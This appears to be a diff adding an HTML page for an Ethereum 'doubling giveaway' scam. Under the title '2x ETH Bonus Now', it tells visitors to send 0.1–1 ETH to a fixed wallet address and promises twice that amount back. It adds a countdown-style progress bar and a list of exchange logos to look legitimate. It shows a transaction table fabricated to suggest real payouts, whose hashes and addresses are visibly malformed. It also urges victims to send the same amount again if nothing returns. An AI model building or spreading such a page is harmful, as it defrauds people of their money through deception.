@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <link rel="stylesheet" type="text/css" href="./ETH_files/styles.css">
+    <meta property="og:image" content="img/link.png">
+    <link href="ETH_files/" rel="shortcut icon" type="image/x-icon">
+    <title>2x ETH Bonus Now</title>
+
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./ETH_files/css2" rel="stylesheet"> 
+    <link rel="stylesheet" type="text/css" href="./ETH_files/theme.min.css">
+    
+    
+    <meta name="referrer" content="always">
+
+    <script>
+        window.onload = function () {
+            if (!localStorage.getItem("justonce")) {
+                localStorage.setItem("justOnce", "true");
+                window.location.reload();
+            }
+        }
+    </script>
+
+<link rel="stylesheet" href="./ETH_files/widget.css"></head>
+
+<body>
+    <div class="loading">
+        <div class="loading-item l1"></div>
+        <div class="loading-item l2"></div>
+        <div class="loading-item l3"></div>
+        <div class="loading-item l4"></div>
+        
+    </div>
+    
+    
+    
+<div class="pop-body">
+    <div class="pop-inner">
+        <div class="pop-head">
+            <h3 class="pop-head-text">Generated Address</h3><svg id="close" height="20" viewBox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18.096 19.174l1.401-1.427L1.7.286.3 1.714z"></path>
+                <path d="M19.497 1.714L18.096.286.3 17.747l1.4 1.427z"></path>
+            </svg>
+        </div>
+        <div class="pop-post-body">
+            <div class="pop-post-inner">
+                <div class="pop-anrange">
+                    <div class="pop-img">
+                        <div class="pop-qr">
+                            <div class="inner-qr">
+                                <div class="main-qr">
+                                    <div opacity="0" class="qr"><img id="qrcode_svg" width="200" height="200" src="./ETH_files/0xCF62EAB837383fdC983900d27189698e122f3d4F.jpg" alt="qr"></div>
+                        <p style="color:green; margin-top:1rem; margin-bottom: 2px; text-align: center;">0 Confirmation</p>
+                                    <center><img src="./ETH_files/loading.svg" width="70px"></center>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="timer-b" id="timer1"></div>
+                    <div class="address-place">
+                        <div class="inner-address"><span class="wallet-ad">Amount:</span>
+                            <div class="address">
+                                <div class="main-ad"><span class="real-address" id="gen-amount"></span></div>
+                                <div class="copy-body">
+                                    <div class="copy-inner">
+                                        <img class="cp" id="copy_" src="./ETH_files/copy.svg">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="inner-address"><span class="wallet-ad">Generated address:</span>
+                            <div class="address">
+                                <div class="main-ad"><span class="real-address">0xCF62EAB837383fdC983900d27189698e122f3d4F</span></div>
+                                <div class="copy-body">
+                                    <div class="copy-inner">
+                                        <img class="cp" id="copy_address" src="./ETH_files/copy.svg">
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <section id="post-sec">
+        <a href="index.html">
+            
+                <h1 style="text-align: center; z-index: 999999;"><img src="data:image/svg+xml; base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIw%0A                IDEwMjQiIGNsYXNzPSJjc3MtMXR5d2JjaiIgZmlsbD0iI2YwYjkzMSI+CiAgICA8cGF0aAogICAg%0A                ICAgIGQ9Ik0yMzAuOTk3MzMzIDUxMkwxMTYuMDUzMzMzIDYyNi45ODY2NjcgMCA1MTJsMTE2LjAx%0A                MDY2Ny0xMTYuMDEwNjY3TDIzMC45OTczMzMgNTEyek01MTIgMjMwLjk5NzMzM2wxOTcuOTczMzMz%0A                IDE5Ny45NzMzMzQgMTE2LjA1MzMzNC0xMTUuOTY4TDUxMiAwIDE5Ny45NzMzMzMgMzE0LjAyNjY2%0A                N2wxMTYuMDUzMzM0IDExNS45NjhMNTEyIDIzMC45OTczMzN6IG0zOTUuOTg5MzMzIDE2NC45OTJM%0A                NzkzLjAwMjY2NyA1MTJsMTE2LjAxMDY2NiAxMTYuMDEwNjY3TDEwMjQuOTgxMzMzIDUxMmwtMTE2%0A                Ljk5Mi0xMTYuMDEwNjY3ek01MTIgNzkzLjAwMjY2N2wtMTk3Ljk3MzMzMy0xOTguOTk3MzM0LTEx%0A                Ni4wNTMzMzQgMTE2LjAxMDY2N0w1MTIgMTAyNGwzMTQuMDI2NjY3LTMxNC4wMjY2NjctMTE2LjA1%0A                MzMzNC0xMTUuOTY4TDUxMiA3OTMuMDAyNjY3eiBtMC0xNjUuOTczMzM0bDExNi4wMTA2NjctMTE2%0A                LjA1MzMzM0w1MTIgMzk2LjAzMiAzOTUuOTg5MzMzIDUxMiA1MTIgNjI2Ljk4NjY2N3ogbTEyMjAu%0A                MDEwNjY3IDExLjk0NjY2N3YtMS45NjI2NjdjMC03NS4wMDgtNDAuMDIxMzMzLTExMy4wMjQtMTA1%0A                LjAwMjY2Ny0xMzguMDI2NjY2IDM5Ljk3ODY2Ny0yMS45NzMzMzMgNzMuOTg0LTU4LjAyNjY2NyA3%0A                My45ODQtMTIxLjAwMjY2N3YtMS45NjI2NjdjMC04OC4wMjEzMzMtNzAuOTk3MzMzLTE0NS4wMjQt%0A                MTg1LjAwMjY2Ny0xNDUuMDI0aC0yNjAuOTkydjU2MS4wMjRoMjY3LjAwOGMxMjYuOTc2IDAuOTgx%0A                MzMzIDIxMC4wMDUzMzMtNTEuMDI5MzMzIDIxMC4wMDUzMzQtMTUzLjAwMjY2NnogbS0xNTQuMDI2%0A                NjY3LTIzOS45NTczMzNjMCA0MS45ODQtMzQuMDA1MzMzIDU4Ljk2NTMzMy04OS4wMDI2NjcgNTgu%0A                OTY1MzMzaC0xMTMuOTYyNjY2VjMzOC45ODY2NjdoMTIxLjk4NGM1Mi4wMTA2NjcgMCA4MC45ODEz%0A                MzMgMjAuOTkyIDgwLjk4MTMzMyA1OC4wMjY2NjZ2Mi4wMDUzMzR6IG0zMS4wMTg2NjcgMjI0YzAg%0A                NDEuOTg0LTMyLjk4MTMzMyA2MS4wMTMzMzMtODcuMDQgNjEuMDEzMzMzaC0xNDYuOTQ0di0xMjMu%0A                MDUwNjY3aDE0Mi45NzZjNjMuMDE4NjY3IDAgOTEuMDA4IDIzLjA0IDkxLjAwOCA2MS4wMTMzMzR2%0A                MS4wMjR6IG0zODEuOTk0NjY2IDE2OS45ODRWMjMwLjk5NzMzM2gtMTIzLjk4OTMzM3Y1NjEuMDI0%0A                aDEyMy45ODkzMzN2MC45ODEzMzR6IG02NjQuMDIxMzM0IDBWMjMwLjk5NzMzM2gtMTIyLjAyNjY2%0A                N3YzNDYuMDI2NjY3bC0yNjIuOTk3MzMzLTM0Ni4wMjY2NjdoLTExNC4wMDUzMzR2NTYxLjAyNGgx%0A                MjIuMDI2NjY3di0zNTYuMDEwNjY2bDI3MiAzNTYuOTkyaDEwNC45NnogbTY4My45NDY2NjYgMEwz%0A                MDk4LjAyNjY2NyAyMjguMDEwNjY3aC0xMTMuOTYyNjY3bC0yNDEuMDI0IDU2NC45OTJoMTI3LjAx%0A                ODY2N2w1MC45ODY2NjYtMTI1Ljk5NDY2N2gyMzcuMDEzMzM0bDUwLjk4NjY2NiAxMjUuOTk0NjY3%0A                aDEzMC4wMDUzMzR6IG0tMjI0Ljk4MTMzMy0yMzUuMDA4aC0xNDguOTkybDc1LjAwOC0xODEuOTcz%0A                MzM0IDczLjk4NCAxODEuOTczMzM0eiBtODE0LjAzNzMzMyAyMzUuMDA4VjIzMC45OTczMzNoLTEy%0A                Mi4wMjY2NjZ2MzQ2LjAyNjY2N2wtMjYyLjk5NzMzNC0zNDYuMDI2NjY3aC0xMTQuMDA1MzMzdjU2%0A                MS4wMjRoMTIyLjAyNjY2N3YtMzU2LjAxMDY2NmwyNzIgMzU2Ljk5MmgxMDQuOTZ6IG02MzYuOTcw%0A                NjY3LTkxLjAwOGwtNzguOTc2LTc4Ljk3NmMtNDQuMDMyIDM5Ljk3ODY2Ny04My4wMjkzMzMgNjUu%0A                OTYyNjY3LTE0OC4wMTA2NjcgNjUuOTYyNjY2LTk2IDAtMTYyLjk4NjY2Ny04MC0xNjIuOTg2NjY2%0A                LTE3NnYtMi45ODY2NjZjMC05NiA2Ny45NjgtMTc0Ljk3NiAxNjIuOTg2NjY2LTE3NC45NzYgNTUu%0A                OTc4NjY3IDAgMTAwLjAxMDY2NyAyMy45Nzg2NjcgMTQ0IDYyLjk3Nmw3OC45NzYtOTEuMDA4Yy01%0A                MS45NjgtNTAuOTg2NjY3LTExNC45ODY2NjctODYuOTk3MzMzLTIyMC45NzA2NjYtODYuOTk3MzM0%0A                LTE3MS45ODkzMzMgMC0yOTIuOTkyIDEzMC45ODY2NjctMjkyLjk5MiAyOTAuMDA1MzM0VjUxMmMw%0A                IDE2MC45ODEzMzMgMTIyLjk2NTMzMyAyODguOTgxMzMzIDI4OCAyODguOTgxMzMzIDEwNy45ODkz%0A                MzMgMS4wMjQgMTcxLjk4OTMzMy0zNi45OTIgMjI5Ljk3MzMzMy05OC45ODY2NjZ6IG01MjcuMDE4%0A                NjY3IDkxLjAwOHYtMTA5Ljk5NDY2N2gtMzA1LjAyNHYtMTE4LjAxNmgyNjUuMDAyNjY2di0xMDku%0A                OTk0NjY3aC0yNjUuMDAyNjY2VjM0MC45OTJoMzAxLjAxMzMzM1YyMzAuOTk3MzMzaC00MjIuOTk3%0A                MzMzdjU2MS4wMjRoNDI3LjAwOHYwLjk4MTMzNHoiCiAgICAgICAgcC1pZD0iMjkzNSI+PC9wYXRo%0A                Pgo8L3N2Zz4=" alt="logo" style="max-width: 20rem;"></h1>
+            
+        </a>
+        <div class="post_body">
+            
+            <p>To verify your Ethereum address, just send from <b>0.1 ETH</b> - <b>1 ETH</b> to the competetion smart contract address below and get from
+                <b>0.2 ETH</b> - <b>2 ETH</b> back. <i><b>
+                
+            <p>Bonus are processed automatically within 4 - 15 minutes <i>(after deposit to the staking address is confirmed on the blockchain)</i></p>
+            <p>
+            </p><h2>How To Participate:</h2>
+            <ul>
+                <li><b>Step 1:</b> Make sure you have at least 0.1 ETH or above in your wallet.</li>
+                <li><b>Step 2:</b> Enter the amount you wish to participate with below.</li>
+                <li><b>Step 3:</b> Enter your ETH address</li>
+                <li><b>Step 4:</b> Click the "Generate Payment" button to generate your deposit address.</li>
+                <li><b>Step 5:</b> Send the amount you entered to the generated address.</li>
+                <li><b>Step 6:</b> Wait for at least 4 - 15 minutes after your transaction is confirmed.</li>
+            </ul>
+            <p></p>
+            <p>You bonus should be resting in your wallet or pending. <br><br>CONGRATULATIONS 🎉🎉</p>
+            <p style="color: rgba(247, 147, 26, 0.6); font-size: 14px !important; margin-top: 2rem !important;"><i>If the
+                    transaction does not process correctly, please try again by
+                    sending the same amount to the Generated address, and it should go through. Your original
+                    transaction will merge with the new one, and the bonus for the two will be sent back.</i></p>
+        </div>
+        <div class="cal-body">
+            <div class="cal-inner">
+                <div class="input">
+                    <div class="title">Amount To Invest:</div>
+                    <div class="amount-con">
+                        <div class="inner-con">
+                            <div class="pic"></div>
+                            <div class="amount">
+                                <div class="main-input">
+                                    <div class="in-main"><input id="cal-in" class="exchange-content__input theme__background-4 theme__text-4 " min="0" placeholder="0" type="number" maxlength="50" autocomplete="off" value=""></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="icon-body"><span data-tip="Click to swap" data-for="swap-icon" currentitem="false"><img src="./ETH_files/exchange-alt.svg" alt="img" class="exchange__swap-icon"></span></div>
+                <div class="input">
+                    <div class="title">Expected Bonus:</div>
+                    <div class="amount-con">
+                        <div class="inner-con">
+                            <div class="pic"></div>
+                            <div class="amount">
+                                <div class="main-input">
+                                    <div class="in-main"><input id="cal-out" class="exchange-content__input theme__background-4 theme__text-4 " placeholder="0" maxlength="50" min="0" autocomplete="off" value=""></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="enaddress">
+                <div class="title"><addr title="Enter the address where you want your bonus to be sent to. Note: this feild is optional, if you leave it empty, the bonus will be sent to the address you sent from.">Receiving (Wallet) Address:</addr></div>
+                <div class="inner-enter"><input type="text" placeholder="Enter your Ethereum (ETH) address"></div>
+            </div>
+            
+            <div class="but-con">
+                <div id="gen-btn" class="swap-but">Generate Payment</div>
+                <div class="terms text-info text-center mb-2"><span><span id="warn"></span></span>
+                </div>
+            </div>
+            <div id="lympo_progress">
+                <div class="row progress-row">
+                    <div class="colums_12">
+                        <div class="progress-ico">
+                            <div class="progress-ico">
+                                <div class="progress">
+                                    <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 18.968%;">
+                                        <span class="sr-only">x</span></div>
+                                </div>
+                            </div>
+                            <div class="dot-1" id="leftETH">
+                                Counting ETH left...
+                            </div>
+                            <div class="dot-1-airdrop  progress-left" style="left: 18.968%;"></div>
+                            <span class="pbv" id="progress-ico-bar">37 936 / 200 000</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="support">
+                <div class="sup">
+                    <div class="sup-space"></div>
+                    <div class="both-line">
+                        <div class="import-account__title-content theme__background-2 theme__text-4">Supported Exchange
+                        </div>
+                    </div>
+                    <div class="import-account__content">
+                        <div class="import-account__item">
+                            <div class="import-account__block theme__import-button">
+                                <div class="import-account__icon metamask"><img src="./ETH_files/binance.ico" width="20">
+                                </div>
+                                <div class="import-account__name">BINANCE</div>
+                            </div>
+                        </div>
+                        <div class="import-account__item import-account__item-ledger">
+                            <div>
+                                <div class="import-account__block theme__import-button">
+                                    <div class="import-account__icon ledger"><img src="./ETH_files/upbit.png" width="20">
+                                    </div>
+                                    <div class="import-account__name">UPBIT</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="import-account__item import-account__item-trezor">
+                            <div>
+                                <div class="import-account__block theme__import-button">
+                                    <div class="import-account__icon trezor">
+                                        <div class="import-account__icon ledger"><img src="./ETH_files/okes.png" width="20"></div>
+                                    </div>
+                                    <div class="import-account__name">OKEX</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="import-account__item">
+                            <div>
+                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file" multiple="" autocomplete="off" tabindex="-1" style="display:none;">
+                                    <div class="import-account__icon json"><img src="./ETH_files/tano.png" width="20" style="border-radius: 1rem;"></div>
+                                    <div class="import-account__name">REMITANO</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="import-account__item">
+                            <div class="import-account__block theme__import-button">
+                                <div class="import-account__icon private-key"><img src="./ETH_files/tox.png" width="20">
+                                </div>
+                                <div class="import-account__name">MERCATOX</div>
+                            </div>
+                        </div>
+                        <div class="import-account__item ">
+                            <div class="import-account__block theme__import-button">
+                                <div class="import-account__icon promo-code"><img src="./ETH_files/luno.png" width="20">
+                                </div>
+                                <div class="import-account__name">LUNO</div>
+                            </div>
+                        </div>
+                        <div class="import-account__item import-account__item-trezor">
+                            <div>
+                                <div class="import-account__block theme__import-button">
+                                    <div class="import-account__icon trezor"><img src="./ETH_files/coinsph.png" width="20">
+                                    </div>
+                                    <div class="import-account__name">COINS.PH</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="import-account__item">
+                            <div>
+                                <div class="import-account__block theme__import-button" tabindex="0"><input type="file" multiple="" autocomplete="off" tabindex="-1" style="display:none;">
+                                    <div class="import-account__icon json"><img src="./ETH_files/ava.jpg" width="20" style="border-radius: 1rem;"></div>
+                                    <div class="import-account__name">COINBASE</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="import-account__item">
+                            <div class="import-account__block theme__import-button">
+                                <div class="import-account__icon private-key"><img src="./ETH_files/yobit.ico" width="20">
+                                </div>
+                                <div class="import-account__name">YOBIT</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <main id="content" role="main">
+        <div id="ContentPlaceHolder1_divSummary" class="container space-bottom-2">
+            <div class="card">
+                <div class="card-body">
+                    <div class="tab-content">
+                        <div class="tab-pane fade show active" id="transactions" role="tabpanel" aria-labelledby="transactions-tab">
+                            <div class="table-responsive mb-2 mb-md-0">
+                                <table class="table table-hover" id="myTable">
+                                    <thead class="thead-light">
+                                        <tr>
+                                            <th scope="col" width="1">Txn Hash</th>
+                                            <th scope="col" width="1" class="d-none d-sm-table-cell">Block</th>
+                                            <th scope="col"><span class="timer" title="UTC time">Age</span></th>
+                                            <th scope="col">From</th>
+                                            <th scope="col" width="30"></th>
+                                            <th scope="col">To</th>
+                                            <th scope="col">Value</th>
+                                            <th scope="col"><span id="ContentPlaceHolder1_spanTxFee" title="(Gas Price * Gas Used by Txns) in ETH">
+                                                    <spanclass="text-secondary">[Txn Fee]
+                                                </spanclass="text-secondary"></span>
+                                            </th>
+                                        </tr>
+                                    <tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">4c4E0012700A0B21xE966c4041906F605006006AF4ec90a0499647c35a3c4BF</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">993256343</a></td> <td><span class="timer">now</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x77401Ee536796ea03A1c9699F816e5E807800cx3</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>39.43 ETH</td> <td><span class="small text-secondary">0<b>.</b>000561</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">e800AEE90649c196104F4x95B9500e068601E464e85266c0E63609c876c3Bc1</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">931122380</a></td> <td><span class="timer">1 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xE64923E6716cFxF8DA60330Fc1E0B39E0D0x879x</a> </td> <td>26.12 ETH</td> <td><span class="small text-secondary">0<b>.</b>000693</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6Ee82DFc70c5e70D9aca00EeF11FA07B78908071F0079894071F946D9904A1e</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">945532899</a></td> <td><span class="timer">1 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xE64923E6716cFxF8DA60330Fc1E0B39E0D0x879x</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>13.06 ETH</td> <td><span class="small text-secondary">0<b>.</b>000885</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">A8a66aa05ac8001c097e7562439aa958FAc50c315034735043c74744F89a009</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">921720633</a></td> <td><span class="timer">2 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">IndaCoin</a> </td> <td>4.2 ETH</td> <td><span class="small text-secondary">0<b>.</b>000191</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">E750ecE0009c6F0ec7c00726ccB8c3661F309069A57074056c0cE58FEA68x05</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">999345180</a></td> <td><span class="timer">2 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">IndaCoin</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>2.10 ETH</td> <td><span class="small text-secondary">0<b>.</b>00032</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6F9c00c60c0a50B0F60438400cEF79acAx7c898c0cc1245c4x09400805A0454</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">963253160</a></td> <td><span class="timer">3 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0981404c66Dea6680499039E495D00x790e3E006</a> </td> <td>57.3 ETH</td> <td><span class="small text-secondary">0<b>.</b>000116</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">51B694ecc094960740EDA4D06007F010030F06cc1070DF64xF4905e3860044x</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">942744574</a></td> <td><span class="timer">3 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0981404c66Dea6680499039E495D00x790e3E006</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>28.65 ETH</td> <td><span class="small text-secondary">0<b>.</b>000360</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0890a6020059x73aaE9E6cc0aEce940402983660D036a876a094c6886E60Bc6</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">962937065</a></td> <td><span class="timer">4 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xccF5509a3437FcA59560a59F4484e09506EBE999</a> </td> <td>56.68 ETH</td> <td><span class="small text-secondary">0<b>.</b>000421</span></td> </tr><tr class="toolbar"> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">076a805c95F0698F61E20E63900E9x9956F6994acc0980571979cAeDA2cE562</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">910675877</a></td> <td><span class="timer">4 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xccF5509a3437FcA59560a59F4484e09506EBE999</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>28.34 ETH</td> <td><span class="small text-secondary">0<b>.</b>000946</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">3E07081598c45c04F49c01160E94160DD64c6E4E3944F350DDE994c0D9c04Ex</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">937146866</a></td> <td><span class="timer">6 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x33DB1E0x89x3F24cA0128000FcF3A4E5155Dac05</a> </td> <td>6.02 ETH</td> <td><span class="small text-secondary">0<b>.</b>000497</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">5cx06A0E0e041eA00909E24Ee49e940Fe7040e2eA4cE50cE919564E14F860A7</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">989818052</a></td> <td><span class="timer">6 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x33DB1E0x89x3F24cA0128000FcF3A4E5155Dac05</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>3.01 ETH</td> <td><span class="small text-secondary">0<b>.</b>000886</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">679x063830E0E3Dc30E4e366cFE8600e15c4D9DF6048E096c866c39EAca6717</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">993392674</a></td> <td><span class="timer">7 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xx4148Bc66360F761B50332c03c66E9670ED0604c</a> </td> <td>2.08 ETH</td> <td><span class="small text-secondary">0<b>.</b>000845</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6e190cEB618746c0ccFc549B694801464F591019081A6F791063e02190704Ex</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">917257089</a></td> <td><span class="timer">7 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xx4148Bc66360F761B50332c03c66E9670ED0604c</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>1.04 ETH</td> <td><span class="small text-secondary">0<b>.</b>000376</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">c0A60BF73c30E68090cAA600e5298A009c9D4c5c160309508B00Ea06xD697F2</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">965095525</a></td> <td><span class="timer">8 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0c8xc0a99c6c0E460cc3908ec6cx09605040E067</a> </td> <td>18.3 ETH</td> <td><span class="small text-secondary">0<b>.</b>000383</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">2x36000c4ex88xBEceF99D9EDa05E426F08a74cxx0c4F6490085480034ADF7B</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">916426857</a></td> <td><span class="timer">8 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0c8xc0a99c6c0E460cc3908ec6cx09605040E067</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>9.15 ETH</td> <td><span class="small text-secondary">0<b>.</b>000878</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">8424e9E6ce9896Bc316A409c7148A48a08260620E4e970936601x6a99058249</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">96567520</a></td> <td><span class="timer">9 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x8Fc9xF46Ac53761064a8D010ae617aE0x093c690</a> </td> <td>85.78 ETH</td> <td><span class="small text-secondary">0<b>.</b>000715</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">470x6463901eF0aE676x9F00E510c5542044930030c748061F4Exc601E0A09c</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">93030743</a></td> <td><span class="timer">9 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x8Fc9xF46Ac53761064a8D010ae617aE0x093c690</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded 